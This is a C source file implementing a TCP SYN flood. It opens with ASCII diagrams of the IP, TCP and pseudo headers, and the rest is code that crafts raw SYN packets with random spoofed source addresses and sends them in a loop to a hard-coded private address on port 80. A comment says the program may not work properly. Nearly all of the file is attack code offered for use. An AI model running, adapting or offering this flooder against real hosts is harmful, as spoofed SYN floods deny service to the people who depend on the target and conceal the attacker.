/* TCP_syn_flooding.c
Update: 2020-05-12T16:42:00+08@China-Guangdong-Zhanjiang+08
*/

/* Header_Format

Pseudo_TCP_Header_Format

0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|      zero     |      PTCL     |           TCP Length          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


TCP_Header_Format

0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset| Rsrvd |W|C|R|C|S|S|Y|I|            Window             |
|       |       |R|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


IP_Header_Format

0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

*/

#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#include <stdbool.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

bool check(bool failed, const char *file, const int line, const char *function, const int error, const char *message) {
    if (failed) {
        fprintf(stderr, "[%s:%d:%s]%d#%s", file, line, function, error, message);
        if (!(0 == errno && 0 == error)) {
            fprintf(stderr, "#%s", strerror(errno));
        }
        fprintf(stderr, "\n");
    }
    errno = 0;
    return failed;
}


typedef const char *State;
static const struct {
    const State _Alive;
    const State _Quit;
} EType = {
    ._Alive = "Alive",
    ._Quit = "Quit",
};
static State state;

void cleanup() {
    state = EType._Quit;
    fprintf(stderr, "terminate TCP_syn_Flooding...""\n");
}

void sig_int(int signo) {
    cleanup();
    exit(0);
}

void initialize() {
    setuid(getpid());

    state = EType._Alive;
    signal(SIGINT, sig_int);
    fprintf(stderr, "start TCP_syn_Flooding...""\n");
}

int ip4_port(char *address, char *ip4, unsigned short *port) {
    char deli = ':';
    int ret = 0;

    if (address != NULL) {
        char *ptr = ip4;
        while (address[0] != '\0' && address[0] != deli) {
            ptr[0] = address[0];
            ptr += 1;
            address += 1;
        }
        ptr[0] = '\0';

        if (inet_addr(ip4) == INADDR_NONE) {
            char chk[128];
            sprintf(chk, "%s", gethostbyname("_")->h_addr_list[0]);
            struct hostent host = *gethostbyname(ip4);
            if (check(0 == strncmp(chk, host.h_addr_list[0], host.h_length), __FILE__, __LINE__, __FUNCTION__, errno, "gethostbyname")) {
                cleanup();
                exit(1);
            }
            sprintf(ip4, "%s", inet_ntoa(*(struct in_addr *)host.h_addr_list[0]));
            ret += 1;
        }

        if (address[0] == deli) {
            address += 1;
            *port = (unsigned short)atoi(address);
            if (check(!(0 < *port && *port < 65536), __FILE__, __LINE__, __FUNCTION__, errno, "!(0 < *port && *port < 65536)")) {
                cleanup();
                exit(1);
            }
            ret += 1;
        }
    }

    if (check(ret != 2, __FILE__, __LINE__, __FUNCTION__, errno, "ret != 2")) {
        cleanup();
        exit(1);
    }
    return ret;
}

unsigned short checksum(void *data, int length) {
    unsigned int sum = 0;
    unsigned short *ptr = data;

    while (length > 1) {
        sum += ptr[0];
        ptr += 1;
        length -= 2;
    }
    if (length == 1) {
        sum += ((unsigned char *)ptr)[0];
    }

    while (sum >> 16 != 0) {
        sum = (sum >> 16) + (sum & 0xFFFF);
    }

    return (unsigned short)(~sum);
}

int TCP_syn_flooding(char *ip4, unsigned short port) {
    int ret = 0;

    int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    struct sockaddr_in target = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = inet_addr(ip4),
        .sin_port = htons(port)
    };

    /* TCP syn packet */
    typedef struct {
        struct iphdr ip;    // 20 byte, tcp header
        struct tcphdr tcp;  // 20 byte, ip header
    } Packet;

    Packet packet = {
        .tcp.source = 0,                     // 16 bit, source port
        .tcp.dest = target.sin_port,         // 16 bit, destination port
        .tcp.seq = 0,                        // 32 bit, sequence number
        .tcp.ack_seq = 0,                    // 32 bit, acknowledgement number
        .tcp.doff = 5,                       //  4 bit, data offset
        .tcp.res1 = 0,                       //  4 bit, reserved
        .tcp.urg = 0,                        //  1 bit, urgent offset valid flag
        .tcp.ack = 0,                        //  1 bit, acknoledgement field valid flag
        .tcp.psh = 0,                        //  1 bit, push flag
        .tcp.rst = 0,                        //  1 bit, reset flag
        .tcp.syn = 1,                        //  1 bit, synchronize sequence number flag
        .tcp.fin = 0,                        //  1 bit, finish sending flag
        .tcp.window = htons(272),            // 16 bit, windows size
        .tcp.check = 0,                      // 16 bit, checksum
        .tcp.urg_ptr = 0,                    // 16 bit, urgent offset

        .ip.version = 4,                     //  4 bit, version
        .ip.ihl = 5,                         //  4 bit, internet header length
        .ip.tos = 0,                         //  8 bit, type of service
        .ip.tot_len = htons(sizeof(packet)), // 16 bit, total length
        .ip.id = getpid(),                   // 16 bit, ID field
        .ip.frag_off = 0,                    // 16 bit, fragment offset
        .ip.ttl = 255,                       //  8 bit, time to live
        .ip.protocol = IPPROTO_TCP,          //  8 bit, protocol
        .ip.check = 0,                       // 16 bit, checksum
        .ip.saddr = inet_addr("127.0.0.1"),  // 32 bit, source address
        .ip.daddr = target.sin_addr.s_addr   // 32 bit, destination address
    };

    /* for TCP header checksum */
    typedef struct {
        unsigned int saddr;                  // 32 bit, source address
        unsigned int daddr;                  // 32 bit, destination address
        unsigned char zero;                  //  8 bit, bit set to zero
        unsigned char protocol;              //  8 bit, protocol
        unsigned short length_tcp;           // 16 bit, TCP length
        struct tcphdr tcp;                   // 20 byte, TCP header
    } Pseudo;

    Pseudo pseudo = {
        .saddr = packet.ip.saddr,
        .daddr = packet.ip.daddr,
        .zero = 0,
        .protocol = packet.ip.protocol,
        .length_tcp = htons(sizeof(packet.tcp)),
        .tcp = packet.tcp
    };


    while (state == EType._Alive) {
        packet.ip.saddr = htonl(rand());
        packet.ip.check = 0;
        packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));

        packet.tcp.source = htons(1025 + rand() % 60000);
        packet.tcp.seq = 761013 + rand() % 100000;
        packet.tcp.check = 0;
        pseudo.saddr = packet.ip.saddr;
        pseudo.tcp = packet.tcp;
        packet.tcp.check = checksum(&pseudo, sizeof(pseudo));

        fprintf(stderr, "%s:%d ==>> %s:%d""\n", inet_ntoa(*(struct in_addr *)&(packet.ip.saddr)), packet.tcp.source, inet_ntoa(*(struct in_addr *)&(packet.ip.daddr)), packet.tcp.dest);
        sendto(raw_fd, &packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
        ret += 1;

        usleep(500 * 1000);
    }

    close(raw_fd);
    return ret;
}

// This program could not work properly.

int main(int argc, char *argv[]) {
    //if (argc < 2) {
    //    fprintf(stderr, "[Usage] %s ip4:port \n", argv[0]);
    //    exit(1);
    //}

    initialize();

    char address[128] = "kali:8888";
    char ip4[64] = "192.168.12.160";
    unsigned short port = 80;

    // ip4_port(argv[1], ip4, &port);
    // ip4_port(address, ip4, &port);
    // fprintf(stderr, "%s:%d\n", ip4, port);

    TCP_syn_flooding(ip4, port);

    return 0;
}
